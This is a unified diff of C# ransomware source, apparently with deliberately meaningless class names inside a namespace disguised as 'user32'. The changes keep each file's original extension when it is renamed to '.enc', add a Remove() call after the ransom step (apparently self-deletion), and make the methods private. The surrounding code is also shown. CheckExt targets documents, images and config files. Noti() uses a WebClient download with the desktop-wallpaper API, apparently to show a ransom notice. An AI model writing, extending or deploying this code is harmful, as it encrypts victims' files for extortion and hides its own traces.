@@ -1,10 +1,11 @@
 ﻿using System;
+using System.CodeDom;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Runtime.InteropServices;
 using static user32.adsjah;
-
+using static user32.jhkasd;
 
 namespace user32
 {
@@ -34,19 +35,22 @@ namespace user32
                     {
                         ef.Write(o);
                     }
-                    File.Move(p, Path.ChangeExtension(p, ".enc"));
+                    FileInfo fext = new FileInfo(p);
+                    string extn = fext.Extension;
+                    File.Move(p, Path.ChangeExtension(p, extn+".enc"));
                 }
             }
             Noti();
+            Remove();
         }
 
-        public const int SPI_SETDESKWALLPAPER = 20;
-        public const int SPIF_UPDATEINIFILE = 1;
-        public const int SPIF_SENDCHANGE = 2;
+        private const int SPI_SETDESKWALLPAPER = 20;
+        private const int SPIF_UPDATEINIFILE = 1;
+        private const int SPIF_SENDCHANGE = 2;
 
         [DllImport("C:\\Windows\\System32\\user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-        public static void Noti()
+        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+        private static void Noti()
         {
             using (var client = new WebClient())
             {
@@ -57,7 +61,7 @@ namespace user32
             }
         }
 
-        public static bool CheckExt(string p)
+        private static bool CheckExt(string p)
         {
             string[] valid = {".txt", ".docx", ".pptx", ".xlsx", ".pdf", ".xml", ".doc", ".png", ".jpg", ".jpeg", ".bmp", ".cfg"};
             FileInfo fext = new FileInfo(p);
